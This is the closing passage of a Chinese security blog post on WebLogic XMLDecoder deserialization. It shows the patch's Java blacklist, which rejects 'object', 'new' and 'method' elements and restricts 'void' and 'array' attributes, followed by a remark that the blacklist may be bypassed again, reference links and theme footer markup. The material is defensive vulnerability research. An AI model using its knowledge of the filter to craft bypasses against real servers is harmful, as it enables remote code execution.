+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:object"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"new"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:new"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"method"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:method"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"void"</span>)) &#123;</span><br><span class="line">                  <span class="keyword">for</span>(<span class="keyword">int</span> attClass = <span class="number">0</span>; attClass &lt; attributes.getLength(); ++attClass) &#123;</span><br><span class="line">                     <span class="keyword">if</span>(!<span class="string">"index"</span>.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid attribute for element void:"</span> + attributes.getQName(attClass));</span><br><span class="line">                     &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"array"</span>)) &#123;</span><br><span class="line">                  String var9 = attributes.getValue(<span class="string">"class"</span>);</span><br><span class="line">                  <span class="keyword">if</span>(var9 != <span class="keyword">null</span> &amp;&amp; !var9.equalsIgnoreCase(<span class="string">"byte"</span>)) &#123;</span><br><span class="line">                     <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"The value of class attribute is not valid for array element."</span>);</span><br><span class="line">                  &#125;</span><br></pre></td></tr></table></figure>
+<p>由于能力有限，过多的思考和总结这里也就暂时谈不上，目前只当作学习了。不知这种黑名单的防御方式下一次被绕过会是在什么时候。</p>
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul>
+<li><a href="https://badcode.cc/2018/05/20/WebLogic-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" target="_blank" rel="noopener">https://badcode.cc/2018/05/20/WebLogic-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</a></li>
+<li><p><a href="https://icematcha.win/?p=1174" target="_blank" rel="noopener">https://icematcha.win/?p=1174</a></p>
+</li>
+<li><p><a href="https://xz.aliyun.com/t/5046" target="_blank" rel="noopener">https://xz.aliyun.com/t/5046</a></p>
+</li>
+<li><a href="https://xz.aliyun.com/t/1848" target="_blank" rel="noopener">https://xz.aliyun.com/t/1848</a></li>
+<li><a href="https://blog.51cto.com/skytina/2055335" target="_blank" rel="noopener">https://blog.51cto.com/skytina/2055335</a></li>
+</ul>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2019/05/Jackson-databind-反序列化分析/" data-toggle="tooltip" data-placement="top" title="Jackson-databind 反序列化分析">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2019/05/SPEL表达式注入-入门篇/" data-toggle="tooltip" data-placement="top" title="SPEL表达式注入-入门篇">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#java" title="java">java</a>
+                        
+                          <a class="tag" href="/tags/#weblogic" title="weblogic">weblogic</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
